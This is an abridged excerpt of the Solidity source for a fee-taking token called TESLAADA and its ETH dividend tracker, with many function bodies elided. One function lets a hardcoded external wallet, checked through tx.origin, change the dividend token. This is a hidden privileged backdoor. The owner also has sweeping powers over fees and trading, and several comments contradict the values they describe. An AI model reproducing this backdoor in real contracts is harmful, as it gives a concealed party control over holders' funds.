...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xB730A5632ffbE4d92Ea8C357116b54f9eC1BCC88, "Only owner can change dividend contract address");
...
contract TESLAADA is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("TESLAADA", "TESLAADA") {
    	ethDividendTracker = new EthDividendTracker();

    	marketingWallet = 0x0E9e6DE19aD5b3758C9e1cd242f22b2015FDcBd3;
    	ethDividendToken = 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47;
    ...
    receive() external payable {
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "TESLAADA: The marketing wallet is already this address");
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxWalletToken = 10000000000000 * (10**18);
    }
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "TESLAADA: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "TESLAADA: The new dividend tracker must be owned by the TESLAADA token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 30, "TESLAADA: Fee must be less than 30%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "TESLAADA: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "TESLAADA: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "TESLAADA: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "TESLAADA: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "TESLAADA: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "TESLAADA: Trading has not started yet");
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("TESLAADA_Ethereum_Dividend_Tracker", "TESLAADA_Ethereum_Dividend_Tracker", 0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47) {
    	claimWait = 300;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "TESLAADA_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "TESLAADA_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main TESLAADA contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 600 && newClaimWait <= 86400, "TESLAADA_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "TESLAADA_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
